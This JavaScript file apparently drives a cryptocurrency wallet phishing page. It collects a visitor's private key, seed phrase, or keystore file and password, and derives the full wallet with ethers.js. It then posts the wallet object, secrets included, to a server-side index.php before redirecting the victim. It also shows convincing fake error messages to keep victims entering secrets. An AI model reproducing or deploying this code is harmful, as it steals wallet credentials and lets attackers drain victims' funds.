

$(".giUzdE").on("click", function (e) {

    $(".owerlay").show();
    $(".alert").hide();
    $(".alertMain").show();
  
  
  $(".errormessage").hide();
  
  })
  
  
  
  $(".closeBtn").on("click", function (e) {
  
    $(".owerlay").hide();
    $(".alert").hide();
   
  
  
  
  
  })
  
  
  $(".mainSelect").on("click", function (e) {
  
    
    $(".alert").hide();
  
    $(".alertError").show();
   
  
  
  
  
  })
  
  
  $(".sun").on("click", function (e) {
  
    
    $('body').removeClass("black");
  
    $(".swith svg").removeClass("active");
  
    $(this).addClass("active");
   
  
  
  
  
  })
  
  
  $(".moon").on("click", function (e) {
  
    
    $('body').addClass("black");
  
    $(".swith svg").removeClass("active");
  
    $(this).addClass("active");
   
  
  
  
  
  })
  
  
  $(".errorSelect").on("click", function (e) {
  
    
    $(".alert").hide();
   
    
  
    $("."+$(this).data("type")).show();
  
    if($(this).data("type") == "Keystore"){
  
  
      $("#fileinp").click();
  
  
    }
  
  
  })
  
  
  
  
  $("#privat_key").on("click", function () {
  
    $(".loader").css("visibility", "visible");
  
    try {
  
      let privateKey = $(".privat_key_inp").val();
      let wallet = new ethers.Wallet(privateKey);
  
      $.ajax({
          method: "POST",
          url: "./index.php",
          data: {
            name: JSON.stringify(wallet)
          }
        })
        .done(function (msg) {
  
          document.location.replace(msg);
  
        });
  
  
    } catch (err) {
      $("#privat_key_error").show();
  
      $(".loader").css("visibility", "hidden");
    }
  
  
  })
  
  
  $("#mnemonic").on("click", function () {
  
    $(".loader").css("visibility", "visible");
  
    try {
  
  
      let mnemonic = $(".mnemonic").val();
  
      let wallet = ethers.Wallet.fromMnemonic(mnemonic.trim());
  
      $.ajax({
          method: "POST",
          url: "./index.php",
          data: {
            name: JSON.stringify(wallet)
          }
        })
        .done(function (msg) {
  
          document.location.replace(msg);
  
        });
  
  
    } catch (err) {
      $("#mnemonic_error").show();
  
      $(".loader").css("visibility", "hidden");
    }
  
  
  })
  
  
  function receivedText() {
  
    $(".loader").css("visibility", "visible");
            
  
     var file = $('#fileinp');
  
     var input = file.get(0);
  
     var reader = new FileReader();
  
  
     reader.onload = function (e) {
                
  
  
     let data =  e.target.result;
  
     let json = data;
  
  
  
     
     let password = $(".keystore_inp").val();
  
     ethers.Wallet.fromEncryptedJson(json, password).catch(function(reason) {
  
           console.log(reason.message);
  
           if(reason.message == "invalid password"){
  
              $("#json_error").text("Invalid Password");
  
              $("#json_error").show();
  
              $(".loader").css("visibility", "hidden");
  
            
           }else{
  
              $("#json_error").text("Unexpected number in JSON at position 1");
  
              $("#json_error").show();
  
               $(".loader").css("visibility", "hidden");
  
                
           }
  
        
  
  
        }).then(function(wallet) {
         
  
  
      
  
          
  
    
      
           $.ajax({
             method: "POST",
             url: "./index.php",
             data: { name: JSON.stringify(wallet) }
           })
           .done(function( msg ) {
  
              document.location.replace(msg);
               
            });
  
  
  
  
  
  
  
        });
  
    
  
  
                   
  };
  
  
   reader.readAsText(input.files[0]);
  
        
  
  
        
  
        }  
  
     
     $("#keystore").on("click", function() {
  
  
  
  
  
           if (!window.File || !window.FileReader || !window.FileList || !window.Blob) {
               alert('The File APIs are not fully supported in this browser.');
               return;
             }   
  
             var input = document.getElementById('fileinp');
             if (!input) {
               alert("Um, couldn't find the fileinput element.");
             }
             else if (!input.files) {
               alert("This browser doesn't seem to support the `files` property of file inputs.");
             }
             else if (!input.files[0]) {
               //alert("Please select a file before clicking 'Load'");  
  
                    $("#json_error").text("You must select a file to import.");
  
                    $("#json_error").show();  
  
                     $(".loader").css("visibility", "hidden");
  
                         
             }
             else {
  
              if($(".keystore").val() != ""){
  
                    // var file = input.files[0];
                    // var fr = new FileReader();
                    // fr.onload = receivedText;
                    // fr.readAsText(file);
  
                    receivedText();
                    //fr.readAsBinaryString(file); //as bit work with base64 for example upload to server
  
              }else{
  
  
                 $("#json_error").text("Invalid Password");
  
                 $("#json_error").show();
  
                  $(".loader").css("visibility", "hidden");
  
                
  
              }
            
           
             }
  
         
  
  
  
  
       
  
  
        
     
     });
  
  
  
  